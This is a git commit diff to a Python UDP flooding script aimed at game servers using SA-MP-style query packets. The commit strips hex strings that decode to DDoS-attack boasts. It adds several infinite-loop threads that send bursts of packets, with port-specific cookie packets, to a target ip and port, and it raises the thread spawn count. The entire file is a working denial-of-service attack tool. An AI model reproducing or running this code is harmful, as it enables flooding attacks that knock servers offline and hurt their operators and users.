c75712ee51389e8be58d859b0398835b76442660
iauawhwjuwhenwhwa <123171566+iauawhwjuwhenwhwa@users.noreply.github.com>
2023-01-25 02:19:03 +0700

    Update a.py

--- a.py
+++ a.py
@@ -13,9 +13,6 @@ orgip =ip
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                        codecs.decode("53414d509538e1a9611e69","hex_codec"),#u
-                       codecs.decode("44444f532041545441434b202d3e2042592058414c4241444f52202d3e2053454e44","hex_codec"),#i
-                       codecs.decode("544845204a4159202d3e2041545441434b202d3e20534552564552","hex_codec"),#u
-                       codecs.decode("5448454a415920582058414c4241444f52202d3e2041545441434b202d3e204558504c4f4954202d3e20534552564552202d3e20554450","hex_codec"),#asu
                        codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                        codecs.decode("081e62da","hex_codec"), #cookie port 7796
                        codecs.decode("081e77da","hex_codec"),#cookie port 7777
@@ -36,6 +33,9 @@ class MyThread(threading.Thread):
                 
                 msg = Pacotes[random.randrange(0,3)]
                      
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
@@ -77,6 +77,149 @@ class MyThread1(threading.Thread):
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                elif(int(port) == 1111):
+                    sock.sendto(Pacotes[9], (ip, int(port)))
+                elif(int(port) == 7778):
+                    sock.sendto(Pacotes[8], (ip, int(port)))
+                elif(int(port) == 2023):
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                elif(int(port) == 7776):
+                    sock.sendto(Pacotes[10], (ip, int(port)))
+                    
+class MyThread2(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM)
+                
+                msg = Pacotes[random.randrange(0,3)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                elif(int(port) == 1111):
+                    sock.sendto(Pacotes[9], (ip, int(port)))
+                elif(int(port) == 7778):
+                    sock.sendto(Pacotes[8], (ip, int(port)))
+                elif(int(port) == 2023):
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                elif(int(port) == 7776):
+                    sock.sendto(Pacotes[10], (ip, int(port)))
+
+
+class MyThread3(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM)
+                
+                msg = Pacotes[random.randrange(0,3)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                elif(int(port) == 1111):
+                    sock.sendto(Pacotes[9], (ip, int(port)))
+                elif(int(port) == 7778):
+                    sock.sendto(Pacotes[8], (ip, int(port)))
+                elif(int(port) == 2023):
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                elif(int(port) == 7776):
+                    sock.sendto(Pacotes[10], (ip, int(port)))
+
+class MyThread4(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM)
+                
+                msg = Pacotes[random.randrange(0,3)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                elif(int(port) == 1111):
+                    sock.sendto(Pacotes[9], (ip, int(port)))
+                elif(int(port) == 7778):
+                    sock.sendto(Pacotes[8], (ip, int(port)))
+                elif(int(port) == 2023):
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                elif(int(port) == 7776):
+                    sock.sendto(Pacotes[10], (ip, int(port)))
+
+class MyThread5(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM)
+                
+                msg = Pacotes[random.randrange(0,3)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
                 
                 
                 if(int(port) == 7777):
@@ -99,11 +242,19 @@ class MyThread1(threading.Thread):
 		
 if __name__ == '__main__':
     try:
-     for x in range(100):                                    
+     for x in range(125):                                    
             mythread = MyThread()
             mythread1 = MyThread1()
-            mythread1.start()
+            mythread2 = MyThread2()
+            mythread3 = MyThread3()
+            mythread4 = MyThread4()
+            mythread5 = MyThread5()
             mythread.start()
+            mythread1.start()
+            mythread2.start()
+            mythread3.start()
+            mythread4.start()            
+            mythread5.start()
             time.sleep(.1)    
     except(KeyboardInterrupt):
          os.system('cls' if os.name == 'nt' else 'clear')
